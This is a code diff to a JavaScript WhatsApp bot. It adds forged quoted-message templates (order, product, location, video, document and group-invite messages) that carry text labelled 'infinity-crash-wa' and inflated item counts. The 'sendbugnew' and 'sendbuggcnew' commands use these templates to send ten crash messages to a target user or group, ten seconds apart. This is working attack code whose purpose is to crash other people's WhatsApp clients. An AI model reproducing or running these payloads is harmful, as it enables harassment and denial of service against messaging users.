@@ -372,6 +372,166 @@ message: {
 } 
 }
 
+//FAKEBUG
+const fbugtroli = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "orderMessage": {
+						"orderId": "3184312811796096",
+						"sellerJid": "6282134110253@s.whatsapp.net",
+						"itemCount": 999999999999999,
+						"status": "INQUIRY",
+						"surface": "CATALOG",
+						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg="
+        }
+        }
+        }
+        const fbugtext = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+        "extendedTextMessage": {
+        "text": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+        "title": `Hmm`,
+        'jpegThumbnail': log0
+        }
+        }
+        }
+const fbugimg = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`, 
+                "jpegThumbnail": thumb
+            } 
+        } 
+    }
+const fbugdocs = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+documentMessage: {
+title: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+jpegThumbnail: log0
+}
+}
+}
+const fbugvn = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: {  
+"audioMessage": {
+"mimetype":"audio/ogg; codecs=opus",
+"seconds": "30",
+"ptt": "true"
+}
+} 
+}
+const fbuggclink = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+"groupInviteMessage": {
+"groupJid": "6288213840883-1616169743@g.us",
+"inviteCode": "mememteeeekkeke",
+"groupName": "P", 
+"caption": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+'jpegThumbnail': log0
+}
+}
+}
+const fbuggif = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+ "videoMessage": { 
+ "title":`⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+ "h": `Hmm`,
+ 'seconds': "30", 
+ 'gifPlayback': 'true', 
+ 'caption': 'kontol',
+ 'jpegThumbnail': log0
+}
+}
+} 
+const fbugvideo = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+"videoMessage": { 
+"title":"hallo bang",
+"h": `Hmm`,
+'seconds': '30', 
+'caption': `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+'jpegThumbnail': log0
+}
+}
+}
+const fbuglokasi = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+locationMessage: {
+name: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`,
+jpegThumbnail: log0
+}
+}
+}
+const fbugtoko = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+"productMessage": {
+"product": {
+"productImage":{
+"mimetype": "image/jpeg",
+"jpegThumbnail": log0 //Gambarnye
+},
+"title": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${ngazap}\n${virshin()}`, //Kasih namalu 
+"description": "SELF BOT", 
+"retailerId": "XD",
+"productImageCount": 999999999
+},
+"businessOwnerJid": `0@s.whatsapp.net`
+}
+}
+}
+
         const sticWait = (hehe) => {
 			ano = fs.readFileSync('./Kir/JANGANDIUBAH/wait.webp')
 			kirbotz.sendMessage(hehe, { sticker: ano, contextInfo: {
@@ -4671,7 +4831,7 @@ if (!m.isGroup) return replyNya(mess.group)
 if (!isPetualang) return replyNya(mess.noPetualang)
 ngab = ['Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
 var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
-var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
+var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','kirbotzfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
 anu = fs.readFileSync('./Lib/dungeon.js');
 var ad = dungeon[Math.floor(Math.random() * dungeon.length)]
 jsonData = JSON.parse(anu);
@@ -4992,89 +5152,51 @@ replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
 break
 case 'sendbugnew' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "orderMessage": {
-						"orderId": "3184312811796096",
-						"sellerJid": "6282134110253@s.whatsapp.net",
-						"itemCount": 999999999999999,
-						"status": "INQUIRY",
-						"surface": "CATALOG",
-						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${virshin()} ${ngazap}`,
-						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
-						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
-            }, 
-        } 
-    }
-kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugtoko})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuglokasi})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugvideo})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugtroli})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbuggif})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuggclink})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugvn})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugdocs})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugtext})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugimg})
 }
-replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
+replyNya('Sukses Send Bug By ❖❬ sʜɪɴᴄʜᴀɴ メ sᴇɴᴘᴀɪ 仫 ❭❖')
 break
 case 'sendbuggcnew' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
-pek = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "orderMessage": {
-						"orderId": "3184312811796096",
-						"sellerJid": "6282134110253@s.whatsapp.net",
-						"itemCount": 9999999999,
-						"status": "INQUIRY",
-						"surface": "CATALOG",
-						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${virshin()} ${ngazap}`,
-						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
-						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
-            }, 
-        } 
-    }
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugtoko})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuglokasi})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbugvideo})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugtroli})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:fbuggif})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbuggclink})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugvn})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugdocs})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugtext})
 await sleep(10000)
-kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: fbugimg})
 }
-replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
+replyNya('Sukses Send Bug By ❖❬ sʜɪɴᴄʜᴀɴ メ sᴇɴᴘᴀɪ 仫 ❭❖')
 break
 case 'join': {
 if (!isCreator) throw mess.owner
